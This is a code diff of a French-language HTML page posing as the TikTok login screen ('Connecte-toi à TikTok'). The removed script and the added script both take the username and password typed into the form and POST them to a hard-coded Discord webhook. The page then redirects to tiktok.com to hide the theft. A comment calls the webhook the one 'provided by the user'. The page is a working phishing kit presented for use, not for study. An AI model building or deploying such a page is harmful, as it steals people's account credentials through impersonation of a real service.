@@ -14,7 +14,6 @@
       height: 100vh;
       margin: 0;
     }
-
     .container {
       background-color: white;
       padding: 30px;
@@ -24,12 +23,10 @@
       max-width: 350px;
       text-align: center;
     }
-
     img.logo {
       width: 60px;
       margin-bottom: 20px;
     }
-
     input[type="text"],
     input[type="password"] {
       width: 100%;
@@ -38,7 +35,6 @@
       border: 1px solid #ccc;
       border-radius: 8px;
     }
-
     button {
       width: 100%;
       padding: 12px;
@@ -49,7 +45,6 @@
       cursor: pointer;
       font-weight: bold;
     }
-
     button:hover {
       background-color: #e91b44;
     }
@@ -57,57 +52,39 @@
 </head>
 <body>
   <div class="container">
-    <!-- Logo TikTok -->
-   
-
     <h2>Connecte-toi à TikTok</h2>
-
-    <!-- Formulaire -->
     <form id="loginForm">
       <input type="text" id="username" placeholder="E-mail ou nom d'utilisateur" required>
       <input type="password" id="password" placeholder="Mot de passe" required>
       <button type="submit">Se connecter</button>
     </form>
   </div>
-<script>
-document.getElementById("loginForm").addEventListener("submit", function(e) {
-  e.preventDefault();
-
-  const username = document.getElementById("username").value;
-  const password = document.getElementById("password").value;
-
-  // Remplace l’URL ci-dessous par ton propre webhook Discord
-  const webhookURL = "https://discord.com/api/webhooks/1375896601762992208/d1GYVNKTVt6T43EPzEnUxILre5OhSwPbPbKyPCjbQYMaGGcampM1A4fNb9OsX4iGSR6p";
-
-  const payload = {
-    content: `Nouvelle connexion reçue :\nUtilisateur : ${username}\nMot de passe : ${password}`
-  };
-
-  fetch(webhookURL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  })
-  .then(response => {
-    if (response.ok) {
-      alert("Connexion envoyée !");
-      window.location.href = "https://www.tiktok.com";
-    } else {
-      alert("Erreur lors de l’envoi.");
-    }
-  })
-  .catch(error => {
-    alert("Erreur réseau.");
-  });
-});
-</script>
   <script>
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
-      e.preventDefault();
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
 
-      // Pas de validation → on redirige directement
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    // Webhook Discord fourni par l'utilisateur
+    const webhookURL = "https://discord.com/api/webhooks/1375896601762992208/d1GYVNKTVt6T43EPzEnUxILre5OhSwPbPbKyPCjbQYMaGGcampM1A4fNb9OsX4iGSR6p";
+
+    const payload = {
+      content: `🔔 Nouvelle connexion reçue :\n👤 Utilisateur : ${username}\n🔑 Mot de passe : ${password}`
+    };
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    })
+    .then(response => {
+      window.location.href = "https://www.tiktok.com";
+    })
+    .catch(() => {
       window.location.href = "https://www.tiktok.com";
     });
+  });
   </script>
 </body>
 </html>
